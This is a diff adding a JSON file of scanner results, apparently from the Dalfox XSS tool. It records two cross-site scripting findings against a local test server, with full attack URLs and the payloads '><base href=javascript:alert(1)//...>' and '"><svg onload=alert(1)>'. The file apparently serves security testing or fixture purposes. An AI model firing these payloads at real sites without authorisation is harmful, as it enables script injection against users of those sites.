@@ -1,0 +1,30 @@
+[
+  {
+    "type": "V",
+    "inject_type": "inHTML-URL",
+    "poc_type": "plain",
+    "method": "GET",
+    "data": "http://127.0.0.1:8081/search.php?q=test%3E%3Cbase+href%3Djavascript%3Aalert%281%29%2F%2F+class%3Ddalfox%3E",
+    "param": "q",
+    "payload": "><base href=javascript:alert(1)// class=dalfox>",
+    "evidence": "1 line:  ch results for: test><base href=javascript:alert(1)// class=dalfox></h1></body></html>",
+    "cwe": "CWE-79",
+    "severity": "High",
+    "message_id": 681,
+    "message_str": "Triggered XSS Payload (found DOM)"
+  },
+  {
+    "type": "R",
+    "inject_type": "inHTML-none",
+    "poc_type": "plain",
+    "method": "POST",
+    "data": "http://127.0.0.1:8081/comment.php?body=%22%3E%3Csvg+onload%3Dalert%281%29%3E",
+    "param": "body",
+    "payload": "\"><svg onload=alert(1)>",
+    "evidence": "reflected in response body",
+    "cwe": "CWE-79",
+    "severity": "Medium",
+    "message_id": 42,
+    "message_str": "Reflected XSS found"
+  }
+]
